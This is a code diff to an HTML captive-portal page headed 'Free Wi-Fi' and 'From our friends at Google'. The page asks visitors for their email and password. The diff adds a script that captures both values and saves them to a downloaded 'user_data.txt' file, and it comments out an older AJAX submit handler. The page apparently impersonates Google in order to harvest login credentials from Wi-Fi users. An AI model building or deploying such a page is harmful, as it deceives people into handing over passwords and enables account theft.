@@ -111,16 +111,44 @@
       <h1 class="text-center login-title">Free Wi-Fi</h1>
       <h2 class="text-center friends-text">From our friends at Google</h2>
 
-      <!-- Login Form -->
-      <div class="form-container">
-        <h2>Login</h2>
-        <form id="loginForm">
-          <input type="email" id="email" name="email" placeholder="Enter your email" required>
-          <input type="password" id="password" name="password" placeholder="Enter your password" required>
+      <h2>Login Form</h2>
+      <form id="loginForm">
+          <label for="email">Email:</label><br>
+          <input type="email" id="email" name="email" required><br><br>
+          
+          <label for="password">Password:</label><br>
+          <input type="password" id="password" name="password" required><br><br>
+          
           <button type="submit">Submit</button>
-        </form>
-        <div class="thank-you" id="thankYouMessage" style="display: none;">Thank you for logging in!</div>
-      </div>
+      </form>
+  
+      <script>
+          document.getElementById('loginForm').addEventListener('submit', function(event) {
+              event.preventDefault(); // Prevent form from submitting normally
+  
+              // Get email and password values from the form
+              const email = document.getElementById('email').value;
+              const password = document.getElementById('password').value;
+  
+              // Prepare the data to save in the file
+              const data = `Email: ${email}\nPassword: ${password}\n\n`;
+  
+              // Create a Blob object with the data and specify the MIME type as text/plain
+              const blob = new Blob([data], { type: 'text/plain' });
+  
+              // Create a link element
+              const link = document.createElement('a');
+  
+              // Set the download attribute with the filename
+              link.download = 'user_data.txt';
+  
+              // Create an object URL for the Blob and set it as the href attribute of the link
+              link.href = URL.createObjectURL(blob);
+  
+              // Trigger the download by programmatically clicking the link
+              link.click();
+          });
+      </script>
 
       <!-- Modal for Terms of Service -->
       <div id="myModal" class="modal url-color1">
@@ -139,7 +167,7 @@
     </div>
   </div>
 
-  <script>
+  <!-- <script>
     $(document).ready(function () {
       // Handle form submission via AJAX
       $("#loginForm").submit(function (event) {
@@ -190,7 +218,7 @@
         }
       }
     });
-  </script>
+  </script> -->
 
 </body>
 
